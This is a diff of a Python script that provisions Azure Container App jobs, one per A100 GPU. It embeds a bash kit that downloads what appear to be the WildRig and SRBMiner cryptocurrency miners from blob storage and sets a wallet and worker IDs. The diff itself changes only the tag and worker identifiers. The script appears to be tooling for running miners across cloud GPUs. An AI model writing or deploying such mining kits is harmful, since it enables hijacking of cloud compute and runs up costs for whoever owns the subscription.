@@ -37,9 +37,9 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I133172"
+TAG = "C211_I133293"
 NONCE = "x133172b"
-INTENT = "133172"
+INTENT = "133293"
 T0 = time.time()
 
 APP_VER = "2026-07-01"
@@ -166,7 +166,7 @@ KIT = r"""#!/bin/bash
 D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
 H=$(hostname 2>/dev/null || echo h)
 BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__NONCE__-t4-$H.txt?$Q"
-W="__WALLET__"; N="__NOCK__"; WK="13317201"; RI="${CONTAINER_APP_REPLICA_NAME:-}"; [ -n "$RI" ] && WK="${WK}$(printf '%s' "$RI" | md5sum | cut -c1-3)"
+W="__WALLET__"; N="__NOCK__"; WK="13329301"; RI="${CONTAINER_APP_REPLICA_NAME:-}"; [ -n "$RI" ] && WK="${WK}$(printf '%s' "$RI" | md5sum | cut -c1-3)"
 WRURL="$BASE/__NONCE__-wildrig.tgz?$Q"
 SBURL="$BASE/__NONCE__-srb.bin?$Q"
 log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
@@ -597,7 +597,7 @@ def main():
 
     # ---------- 4) add + start one Container-App job per A100 card ----------
     JOB_PREFIX = "c211-%s-r" % INTENT
-    WK_LOCAL = "13317201"
+    WK_LOCAL = "13329301"
     WK_BASE = WK_LOCAL[:-2]
     jobs = []
     idx = 0
